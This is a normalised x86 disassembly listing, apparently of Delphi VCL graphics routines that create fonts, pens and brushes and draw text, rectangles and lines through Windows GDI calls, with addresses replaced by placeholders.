mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b886
mov eax [ ebp - 0x4 ]
call sub_41b59c
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_41b88c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_413bac
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413840
mov ebx eax
mov eax ebx
call sub_41ce58
inc [ ebp - 0x4 ]
mov eax ebx
call sub_41d1dc
mov eax [ rw-data ]
call sub_41b820
mov eax [ rw-data ]
call sub_41b820
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b930
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_413c10
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_413840
call sub_41d0b4
inc esi
dec ebx
jne r-xdata
sub_41bf7f
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_4132f0
retn
sub_41bfb0
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402d40
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402b30
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_41c064
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41b5a8
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_41c0b8
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41b68c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_41c0fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_413de4
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41bdbc
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41bdbc
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41b7b4
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41c238
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c1a1
mov eax [ ebp - 0x8 ]
call sub_41bdcc
retn
mov eax ebx
call sub_41c4bc
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41c4d8
sub_41c1e8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41bdbc
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41b73c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c234
mov eax [ ebp - 0x4 ]
call sub_41bdcc
retn
sub_41c24c
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c3dc
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_403f90
retn
mov eax [ rw-data ]
call sub_41b590
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41b59c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4041d0
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_4083dc
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_4041d0
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_4083dc
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4041d0
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_407ba4
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_41c530
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_41c3f4
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_41bfb0
mov edx esp
mov eax ebx
call sub_41c1e8
add esp 0x2c
pop esi
pop ebx
retn
sub_41c420
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41c1d0
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41c1e8
add esp 0x2c
pop esi
pop ebx
retn
sub_41c460
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41c1d0
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402c40
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_404208
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402b30
mov edx esp
mov eax ebx
call sub_41c1e8
sub_41c4d8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_41c420
pop esi
pop ebx
retn
sub_41c504
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41c1d0
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41c1e8
add esp 0x30
pop ebx
retn
sub_41c538
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41c1d0
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_41c1e8
add esp 0x2c
pop esi
pop ebx
retn
sub_41c568
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41c1d0
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_41c1e8
add esp 0x2c
pop esi
pop ebx
retn
sub_41c590
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41b5a8
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_41c5d4
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41b68c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_41c5fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_413de4
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41bdbc
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41bdbc
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41b7b4
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41c7e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c685
mov eax [ ebp - 0x8 ]
call sub_41bdcc
retn
sub_41c6b4
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41c6cc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41bdbc
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41b73c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c718
mov eax [ ebp - 0x4 ]
call sub_41bdcc
retn
sub_41c724
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41c6b4
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41c6cc
add esp 0x10
pop esi
pop ebx
retn
sub_41c74c
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41b590
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41b59c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41bd78
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_41c800
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41c6b4
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_41c6cc
add esp 0x10
pop esi
pop ebx
retn
sub_41c830
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41c6b4
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_41c6cc
sub_41c85c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41b5a8
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_41c89c
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41b68c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_41c8c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_413de4
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41bdbc
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41bdbc
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41b7b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c93e
mov eax [ ebp - 0x8 ]
call sub_41bdcc
retn
sub_41c96c
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_41c988
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41bdbc
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41b73c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c9d4
mov eax [ ebp - 0x4 ]
call sub_41bdcc
retn
sub_41c9d8
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_41c988
add esp 0x10
pop edi
pop esi
retn
sub_41ca04
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41c96c
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_41c988
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_41ca38
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41b590
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41b59c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41bd78
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_41cb20
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41c96c
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_41c988
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_41cb54
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403204
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c064
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41d404
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c590
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41d424
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c85c
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41d444
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_413b24
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_41cc18
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_413bc0
xor edx edx
mov eax esi
call sub_41d23c
mov eax [ esi + 0xc ]
call sub_403234
mov eax [ esi + 0x10 ]
call sub_403234
mov eax [ esi + 0x14 ]
call sub_403234
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413db8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_41cc74
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d290
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41d290
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41ccfc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d290
mov eax [ ebx + 0x14 ]
call sub_41c9fc
call sub_41bd78
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41bd78
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_41240c
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41cda8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d290
mov eax [ ebx + 0x14 ]
call sub_41ca38
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41cde4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d290
mov eax [ ebx + 0x14 ]
call sub_41ca38
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41ce20
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d290
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41ce80
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d290
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_41ceac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d290
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41cee4
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d290
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41cf20
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_41d1bc
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_41cf4c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d290
mov eax ebx
call sub_41cf20
cmp al 0x1
jne r-xdata
push 0x0
mov eax esi
call sub_40422c
push eax
mov eax esi
call sub_40442c
push eax
push 0x0
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov edx esi
mov eax ebx
call sub_41d01c
mov edx eax
add edx edi
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41ce80
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx esi
mov eax ebx
call sub_41d01c
inc eax
add edi eax
sub_41cfd8
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d290
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_40422c
push eax
mov eax edi
call sub_40442c
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_41d01c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41cfd8
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41d038
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41cfd8
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41d058
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d0ab
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
